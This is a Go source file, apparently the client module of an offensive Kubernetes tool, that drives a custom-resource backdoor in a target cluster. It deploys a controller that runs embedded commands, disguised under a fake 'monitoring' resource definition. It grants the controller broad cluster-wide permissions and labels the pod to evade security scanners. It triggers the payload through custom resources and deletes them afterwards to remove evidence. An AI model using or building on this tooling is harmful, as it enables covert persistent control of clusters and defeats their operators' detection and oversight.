package crd_backdoor

import (
	"encoding/json"
	"fmt"
	"os"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/shared"
)

type BackdoorResult struct {
	Actions []shared.ActionInfo `json:"actions"`
	Success bool               `json:"success"`
}

func Execute(target, action, crdName, output string) error {
	result := &BackdoorResult{}

	var actions []struct {
		name   string
		detail string
		cmd    string
	}

	switch action {
	case "trigger":
		actions = []struct {
			name   string
			detail string
			cmd    string
		}{
			{"create_cr", "create custom resource instance to trigger reconciliation", "crd_create_cr"},
			{"execute_payload", "controller executes embedded payload on reconcile event", "crd_execute"},
			{"cleanup_cr", "delete triggering CR to remove evidence", "crd_cleanup"},
		}
	case "remove":
		actions = []struct {
			name   string
			detail string
			cmd    string
		}{
			{"delete_controller", "remove backdoor controller deployment", "crd_delete_ctrl"},
			{"delete_crd", "remove custom resource definition from cluster", "crd_delete_crd"},
			{"delete_rbac", "remove associated ClusterRole and ClusterRoleBinding", "crd_delete_rbac"},
		}
	default: // deploy
		actions = []struct {
			name   string
			detail string
			cmd    string
		}{
			{"create_crd", "register CRD with legitimate-looking schema (monitoring.internal/v1)", "crd_create"},
			{"deploy_controller", "deploy controller pod that executes commands on CR creation", "crd_deploy_ctrl"},
			{"create_rbac", "create ClusterRole with broad permissions for controller SA", "crd_create_rbac"},
			{"hide_controller", "label controller pod to avoid detection by kube-bench/polaris", "crd_hide"},
		}
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + action + "#" + crdName
		status := shared.SendCommand(target, "/crd_backdoor", cmd)
		result.Actions = append(result.Actions, shared.ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = shared.AllSucceeded(result.Actions)

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}
